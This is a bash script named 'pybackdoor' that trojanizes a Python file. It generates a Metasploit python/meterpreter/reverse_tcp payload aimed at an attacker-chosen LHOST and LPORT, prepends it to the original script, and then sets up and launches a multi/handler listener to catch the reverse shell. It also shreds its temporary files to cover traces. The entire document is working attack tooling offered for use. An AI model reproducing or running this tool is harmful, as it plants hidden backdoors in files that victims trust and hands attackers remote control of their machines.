#!/bin/bash
# pybackdoor V1.0

clear
figlet -f big PYBACKDOOR
echo ""
read -p "[ + ] LHOST : " lh
echo ""
read -p "[ + ] LPORT : " lp
echo ""
read -p "[ + ] path to Original File [ PYTHON ] : " pyfile
echo ""
sleep 0.5
echo "[ * ] Generating the backdoor ..." | pv -qL 10
echo ""
xterm -T "Creating Payload ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
PID=$!
wait $PID
sleep 1
echo "[ # ] Encrypting shellcode ..." | pv -qL 10
echo ""
cat temp.txt > $(basename $pyfile)
echo '' >> $(basename $pyfile)
cat $pyfile >> $(basename $pyfile)
sleep 0.5
echo "[ + ] Shellcode encrypted ..." | pv -qL 10
echo ""
sleep 1
echo "[ + ] backdoor saved in folder --> $PWD/$(basename $pyfile)" | pv -qL 10
echo ""
sleep 1.5
echo "[ + ] Cleaning up ... " | pv -qL 10
echo ""
shred -n 5 temp.txt -u
echo "[ + ] OK ... " | pv -qL 10
echo ""
echo ""
sleep 1.1
x=0
while [ $x = 0 ]
do
read -p "[ ? ] Do you want to start Listener? [ Y/n ] : " listener1
	case "$listener1" in
n)
echo '' && exit
;;
Y)
echo ""
sleep 0.7
echo "[ + ] Creating handler.rc file ..." | pv -qL 10
echo ""
sleep 0.5
touch handler.rc && chmod 777 handler.rc
echo use exploit/multi/handler >> handler.rc
echo set payload python/meterpreter/reverse_tcp >> handler.rc
echo set LHOST $lh >> handler.rc
echo set LPORT $lp >> handler.rc
echo exploit >> handler.rc
echo "[ + ] handler.rc created successfully ..." | pv -qL 10
echo ""
sleep 1
echo "[ + ] Starting Metasploit ... " | pv -qL 10
echo ""
sleep 0.8
msfconsole -r handler.rc
echo ""
echo ""
echo "[ + ] Cleaning handler.rc ... " | pv -qL 10
echo ""
shred -n 5 handler.rc -u
echo "[ + ] OK ..." | pv -qL 10
echo ""
sleep 1.1
exit
esac
done

